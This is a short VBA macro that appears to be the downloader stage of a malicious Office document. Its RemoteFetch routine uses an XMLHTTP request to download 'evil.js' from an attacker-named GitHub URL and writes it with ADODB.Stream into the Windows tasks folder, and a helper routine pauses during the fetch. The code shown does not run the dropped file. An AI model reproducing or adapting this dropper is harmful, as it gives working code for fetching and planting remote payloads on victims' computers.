Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

Sub RemoteFetch()
    filepath = "c:\\windows\\tasks\\evil.js"
    URL = "http://github.com/attacker/evil.js"
    
    Set xhr = CreateObject("Msxml2.ServerXMLHTTP.6.0")
    With xhr
        .Open "GET", URL, False
        .Send
    End With
    Wait (2)
    If xhr.Status = 200 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(filepath) Then fso.DeleteFile (filepath)
        
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write (xhr.ResponseBody)
        stream.Position = 0
        stream.SaveToFile (filepath)
        stream.Close
    End If
End Sub
